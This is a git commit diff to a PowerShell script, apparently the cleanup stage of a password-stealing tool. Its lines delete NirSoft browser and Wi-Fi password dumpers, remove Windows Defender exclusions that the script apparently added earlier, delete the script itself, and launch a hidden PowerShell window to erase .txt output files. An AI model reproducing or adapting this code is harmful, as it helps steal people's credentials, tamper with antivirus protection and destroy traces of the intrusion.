8b291eeede35ac7644931ede9d911f955bb11820
HkdzoEu25 <134591774+HkdzoEu25@users.noreply.github.com>
2023-05-25 11:02:09 +0200

    Update djzpoj52.ps1

--- djzpoj52.ps1
+++ djzpoj52.ps1
@@ -34,7 +34,7 @@ Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
-Remove-Item ciaoV2.ps1
+Remove-Item djzpoj52.ps1
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
